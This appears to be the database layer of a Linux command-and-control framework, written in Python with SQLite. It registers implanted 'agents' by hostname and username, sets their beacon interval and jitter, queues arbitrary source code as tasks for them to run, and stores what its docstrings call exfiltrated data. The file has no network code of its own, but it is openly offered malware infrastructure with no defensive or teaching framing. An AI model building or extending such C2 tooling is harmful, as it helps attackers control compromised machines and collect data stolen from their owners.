import sqlite3
from typing import Tuple, Dict, Any, Optional

class C2Database:
    def __init__(self, db_file: str = "linux_c2_core.db"):
        self.db_file = db_file
        self.init_db()

    def init_db(self):
        """Initializes tables using transactional locks to ensure schema continuity."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS agents (
                    agent_id TEXT PRIMARY KEY, 
                    hostname TEXT, 
                    username TEXT, 
                    distribution TEXT, 
                    status TEXT, 
                    jitter INTEGER, 
                    beacon_interval INTEGER
                )""")
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id TEXT PRIMARY KEY, 
                    agent_id TEXT, 
                    module_name TEXT,
                    source_code TEXT, 
                    status TEXT, 
                    output TEXT,
                    schedule_type TEXT, 
                    schedule_value TEXT, 
                    duration INTEGER
                )""")
            conn.commit()

    def register_or_update_agent(self, agent_id: Optional[str], hostname: str, username: str, distribution: str) -> str:
        """Saves a newly checked-in agent profile or sets an existing one to Active."""
        import uuid
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            if not agent_id:
                agent_id = str(uuid.uuid4())[:8]
                cursor.execute(
                    "INSERT INTO agents VALUES (?, ?, ?, ?, 'Active', 3, 15)",
                    (agent_id, hostname, username, distribution)
                )
            else:
                cursor.execute("UPDATE agents SET status='Active' WHERE agent_id=?", (agent_id,))
            conn.commit()
        return agent_id

    def get_agent_config_and_pending_task(self, agent_id: str) -> Tuple[Tuple[int, int], Optional[Tuple]]:
        """Fetches dynamic timing settings alongside any unexecuted operational tasks."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute("""
                SELECT task_id, module_name, source_code, schedule_type, schedule_value, duration 
                FROM tasks 
                WHERE agent_id=? AND status='Pending'
            """, (agent_id,))
            task_row = cursor.fetchone()
            
            cursor.execute("SELECT jitter, beacon_interval FROM agents WHERE agent_id=?", (agent_id,))
            config_row = cursor.fetchone()
        return config_row, task_row

    def update_task_results(self, task_id: str, status: str, output: str):
        """Logs exfiltrated data outputs directly back into the task ledger database."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE tasks SET status=?, output=? WHERE task_id=?", (status, output, task_id))
            conn.commit()

    def add_raw_task(self, task_id: str, agent_id: str, name: str, code: str, s_type: str, s_val: str, duration: int):
        """Enqueues an operational task block targeting a specific remote implant signature."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute("INSERT INTO tasks VALUES (?, ?, ?, ?, 'Pending', '', ?, ?, ?)", 
                           (task_id, agent_id, name, code, s_type, s_val, duration))
            conn.commit()

    def update_agent_config(self, agent_id: str, jitter: int, interval: int):
        """Modifies operational configuration values for automated runtime synchronization."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute("UPDATE agents SET jitter=?, beacon_interval=? WHERE agent_id=?", (jitter, interval, agent_id))
            conn.commit()

    def log_task_deployment(self, task_id: str, agent_id: str, name: str, code: str, s_type: str, s_val: str, duration: int):
        """Logs the task initialization into history immediately when deployed by the operator."""
        with sqlite3.connect(self.db_file) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO tasks VALUES (?, ?, ?, ?, 'Dispatched', '', ?, ?, ?)", 
                (task_id, agent_id, name, code, s_type, s_val, duration)
            )
            conn.commit()
